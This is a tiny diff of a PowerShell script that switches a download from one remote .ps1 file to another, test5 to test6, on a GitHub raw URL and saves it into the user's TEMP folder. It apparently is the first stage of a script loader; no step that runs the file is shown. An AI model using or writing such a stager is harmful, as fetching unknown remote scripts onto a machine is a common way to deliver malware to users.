@@ -1,5 +1,5 @@
-$src  = "https://raw.githubusercontent.com/AnatolikFFF/kupikupi_nonono/refs/heads/main/test5.ps1"
-$dest = Join-Path $env:TEMP "test5.ps1"
+$src  = "https://raw.githubusercontent.com/AnatolikFFF/kupikupi_nonono/refs/heads/main/test6.ps1"
+$dest = Join-Path $env:TEMP "test6.ps1"
 
 Invoke-WebRequest -Uri $src -OutFile $dest
 
